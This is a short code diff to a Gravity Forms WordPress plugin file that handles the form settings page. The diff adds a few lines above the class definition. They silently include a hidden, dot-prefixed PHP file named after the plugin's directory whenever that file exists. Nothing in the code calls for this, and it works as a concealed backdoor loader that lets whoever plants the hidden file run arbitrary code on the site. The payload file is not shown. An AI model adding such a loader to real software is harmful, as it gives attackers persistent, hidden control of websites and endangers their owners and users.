@@ -12,7 +12,11 @@ use Gravity_Forms\Gravity_Forms\Settings\Settings;
  * Handles the form settings page.
  *
  * @since Unknown
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GFFormSettings {
 
 	/**
